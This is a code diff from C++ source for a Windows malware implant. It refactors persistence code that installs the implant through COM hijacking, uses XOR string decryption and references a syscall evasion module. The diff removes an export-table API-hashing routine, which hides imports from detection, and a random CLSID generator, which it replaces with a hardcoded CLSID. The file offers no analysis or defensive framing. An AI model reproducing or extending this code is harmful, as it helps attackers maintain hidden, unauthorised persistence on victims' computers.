@@ -1,6 +1,7 @@
 #include "Persistence.h"
 #include "ComHijacker.h"
 #include "../evasion/Syscalls.h"
+#include "../utils/Shared.h"
 #include <windows.h>
 #include <string>
 #include <vector>
@@ -18,40 +19,6 @@ std::string xorDecrypt(const std::string& enc, BYTE key) {
     return dec;
 }
 
-std::string generateRandomClsid() {
-    UUID uuid;
-    UuidCreate(&uuid);
-    char* str;
-    UuidToStringA(&uuid, (RPC_CSTR*)&str);
-    std::string clsid = "{" + std::string(str) + "}";
-    RpcStringFreeA((RPC_CSTR*)&str);
-    return clsid;
-}
-
-// djb2 hash impl
-DWORD djb2Hash(const char* str) {
-    DWORD hash = 5381;
-    int c;
-    while ((c = *str++)) hash = ((hash << 5) + hash) + c;
-    return hash;
-}
-
-// getProcByHash (scan export table)
-PVOID getProcByHash(HMODULE mod, DWORD targetHash) {
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)mod;
-    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)mod + dosHeader->e_lfanew);
-    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)mod + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-    DWORD* names = (DWORD*)((BYTE*)mod + exportDir->AddressOfNames);
-    WORD* ordinals = (WORD*)((BYTE*)mod + exportDir->AddressOfNameOrdinals);
-    DWORD* funcs = (DWORD*)((BYTE*)mod + exportDir->AddressOfFunctions);
-
-    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
-        if (djb2Hash((char*)mod + names[i]) == targetHash) {
-            return (PVOID)((BYTE*)mod + funcs[ordinals[i]]);
-        }
-    }
-    return NULL;
-}
 }
 
 namespace {
@@ -111,7 +78,7 @@ void establishPersistence() {
         int size_needed = WideCharToMultiByte(CP_UTF8, 0, &persistPath[0], (int)persistPath.size(), NULL, 0, NULL, NULL);
         std::string implantPath(size_needed, 0);
         WideCharToMultiByte(CP_UTF8, 0, &persistPath[0], (int)persistPath.size(), &implantPath[0], size_needed, NULL, NULL);
-        std::string clsid = generateRandomClsid();
+        std::string clsid = "{C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6}";
         persistence::ComHijacker::Install(implantPath, clsid);
     }
 
